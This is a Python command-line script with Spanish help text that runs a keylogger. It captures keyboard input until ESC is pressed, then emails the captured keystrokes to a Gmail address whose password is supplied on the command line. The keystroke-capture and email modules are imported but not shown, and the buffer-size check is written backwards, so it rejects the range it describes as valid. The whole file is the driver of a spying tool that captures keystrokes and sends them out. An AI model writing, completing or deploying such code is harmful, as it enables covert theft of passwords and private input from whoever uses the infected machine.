import argparse
from MainModule.InputModule import KeyIntercept
from MainModule.EmailModule import send_content_file

parser = argparse.ArgumentParser(description="Script sencillo que captura la entrada de teclado"
                                             " del usuario, el programa se detiene cuando pulsas"
                                             " la tecla ESC,cuando el programa termina envía la "
                                             "información capturada a el correo indicado."
                                             "Debe ser de Gmail")

parser.add_argument("-e", "--email", required=True, help="Correo al que enviar la información")
parser.add_argument("-p", "--passwd", required=True, help="Contraseña del correo especificado")
parser.add_argument("-s", "--subject", default="Key Response", help="Asunto del correo")
parser.add_argument("-f", "--file-temp", default="output.txt", help="Archivo temporal")
parser.add_argument("-b", "--buffer", type=int, default=1024,
                    help="Tamaño del arreglo en memoria, esto es para evitar el desbordamiento "
                         "de memoria, el valor puede oscilar entre 1024 y 10240")
args = parser.parse_args()


def simple_verify():
    if 1024 < args.buffer < 10240:
        print("El buffer no puede ser menor a 1024 y mayor a 10240")
        parser.print_help()
        parser.exit(-1)
    if len(args.passwd) < 5:
        print("La contraseña no puede ser tan corta")
        parser.print_help()
        parser.exit(-1)


if __name__ == "__main__":
    try:
        simple_verify()
        key_intercept = KeyIntercept(
            temp_file=args.file_temp,
            buffer_size=args.buffer)
        key_intercept.init_loop()
        send_content_file(
            file_name=args.file_temp,
            email=args.email,
            passwd=args.passwd,
            subject=args.subject)
    except KeyboardInterrupt:
        print("Programa finalizado por el usuario")
    except Exception as e:
        print("Excepción no controlada", e)
